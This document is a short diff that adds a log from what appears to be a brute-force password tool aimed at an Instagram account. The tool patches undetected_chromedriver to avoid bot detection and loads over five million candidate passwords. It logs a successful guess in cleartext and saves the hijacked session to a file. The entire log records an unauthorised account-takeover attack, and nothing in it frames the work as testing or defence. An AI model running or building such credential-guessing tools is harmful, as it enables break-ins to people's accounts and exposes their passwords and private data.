@@ -1,0 +1,10 @@
+2025-06-06 17:19:12,670 - INFO - patching driver executable C:\Users\Orange\appdata\roaming\undetected_chromedriver\undetected_chromedriver.exe
+2025-06-06 17:19:14,708 - INFO - Driver initialized successfully
+2025-06-06 17:19:20,959 - INFO - Loaded 5142078 passwords for testing
+2025-06-06 17:19:20,960 - INFO - Attempt 1/5142078: Testing password '@ln@jdy0097256795273304m@l@k69'
+2025-06-06 17:20:12,738 - INFO - Password incorrect: @ln@jdy0097256795273304m@l@k69
+2025-06-06 17:20:14,893 - INFO - Attempt 2/5142078: Testing password '83136071MsH@'
+2025-06-06 17:20:57,373 - INFO - Password incorrect: 83136071MsH@
+2025-06-06 17:20:59,676 - INFO - Attempt 3/5142078: Testing password '0781134641Mm@'
+2025-06-06 17:21:40,010 - INFO - SUCCESS! Valid password found: 0781134641Mm@
+2025-06-06 17:21:40,012 - INFO - Session data saved to instagram_session_20250606_171908.json
